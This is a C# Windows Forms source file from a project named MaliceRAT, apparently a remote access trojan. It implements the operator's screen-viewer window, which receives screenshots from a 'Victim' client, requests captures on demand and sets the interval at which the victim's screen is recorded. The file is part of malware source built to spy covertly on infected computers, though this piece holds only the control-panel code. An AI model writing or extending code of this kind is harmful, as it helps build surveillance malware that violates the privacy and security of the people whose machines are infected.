using System;
using System.Drawing;
using System.Windows.Forms;
using MaliceRAT.RatServer;

namespace MaliceRAT.RatUI
{
    public partial class ScreenViewForm : Form
    {
        private int clientId;
        private Server server;

        public ScreenViewForm(int clientId, Server server)
        {
            InitializeComponent();
            this.clientId = clientId;
            this.server = server;
            server.ScreenshotReceived += UpdateScreenImage;

            Victim victim = server.GetVictimById(clientId);
            titleLabel.Text = "Screen viewer [" + (victim != null ? victim.User : "Unknown") + "]";

            int halfScreenWidth = Screen.PrimaryScreen.WorkingArea.Width / 2;
            int halfScreenHeight = Screen.PrimaryScreen.WorkingArea.Height / 2;

            this.MaximumSize = new Size(halfScreenWidth, halfScreenHeight);

            pictureBox.SizeMode = PictureBoxSizeMode.StretchImage;
            pictureBox.Dock = DockStyle.Fill;
        }

        private void StopButton_Click(object sender, EventArgs e)
        {
            server.SetScreenUpdateInterval(clientId, 0);
        }

        private void ScreenViewForm_FormClosing(object sender, FormClosingEventArgs e)
        {
            server.SetScreenUpdateInterval(clientId, 0);
        }

        private void UpdateButton_Click(object sender, EventArgs e)
        {
            server.RequestScreenshot(clientId);
        }

        private void UpdateIntervalButton_Click(object sender, EventArgs e)
        {
            if (int.TryParse(intervalTextBox.Text, out int interval))
            {
                server.SetScreenUpdateInterval(clientId, interval);
            }
            else
            {
                MessageBox.Show("Please enter a valid number for the interval.");
            }
        }

        public void UpdateScreenImage(byte[] imageData)
        {
            using (var ms = new System.IO.MemoryStream(imageData))
            {
                Image image = Image.FromStream(ms);
                pictureBox.Image = image;
            }
        }
    }
}